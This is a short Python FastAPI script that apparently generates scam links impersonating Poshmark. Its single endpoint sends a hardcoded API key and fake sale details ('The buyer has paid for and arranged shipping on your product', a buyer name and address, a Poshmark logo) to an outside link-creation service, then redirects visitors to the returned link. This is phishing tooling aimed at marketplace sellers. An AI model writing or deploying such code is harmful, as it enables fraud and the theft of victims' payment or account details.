from fastapi import FastAPI
from fastapi.responses import RedirectResponse, PlainTextResponse
import pymysql
import pymysql.cursors
from config import host, user, password, db_name
import requests


app = FastAPI()

@app.get("/listing/{item}")
def new():
    url = 'https://rakuzanapi.com/api/createLink'

    headers = {
        'key': 'akwd7749221011picbs33m1l',
        'title': 'The buyer has paid for and arranged shipping on your product',
        'price': ' ',
        'name': 'Jeff J. Mathis',
        'address': '1586 Ritter Street Huntsville, AL 35816',
        'photo': 'https://s3-symbol-logo.tradingview.com/poshmark--600.png',
        'balance': '1',
        "linkService": "poshmark_us"
    }

    response = requests.post(url, data=headers).json()
    print(response)
    url = response['link']
    id_ = response['id']
    return RedirectResponse(url)
